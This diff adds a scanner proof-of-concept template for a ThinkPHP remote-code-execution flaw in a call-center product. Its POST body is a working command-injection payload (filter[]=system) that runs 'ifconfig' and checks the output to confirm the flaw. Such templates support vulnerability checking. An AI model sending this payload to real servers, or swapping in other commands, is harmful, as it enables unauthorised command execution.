@@ -1,0 +1,20 @@
+name: poc-yaml-shenoutongxin-Thinkphp-RCE
+transport: http
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /callcenter/public/index.php/index.php?s=index/index/index
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: s=ifconfig&_method=__construct&method=POST&filter[]=system
+    expression: response.status == 302 && response.body.bcontains(b'eth0:')
+
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139881024
+
